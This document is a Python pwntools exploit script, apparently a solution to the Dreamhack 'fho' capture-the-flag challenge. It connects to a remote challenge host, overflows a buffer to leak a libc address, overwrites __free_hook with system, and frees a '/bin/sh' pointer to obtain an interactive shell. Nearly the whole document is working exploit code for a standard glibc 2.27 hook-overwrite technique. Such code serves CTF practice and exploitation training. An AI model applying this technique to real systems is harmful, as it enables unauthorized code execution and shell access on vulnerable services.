#! /usr/bin/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

binary = './fho'
p = remote('host1.dreamhack.games',15343)
e = ELF(binary)
libc = ELF('libc-2.27.so')

# [1] Leak libc base
buf = 'A' * 0x48
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)
libc_base = libc_start_main_xx - (libc.sym['__libc_start_main'] + 231)
#libc_base = libc_start_main_xx - libc.libc_start_main_return

system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))


#encode(encoding='UTF-8'), default = UTF-8
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
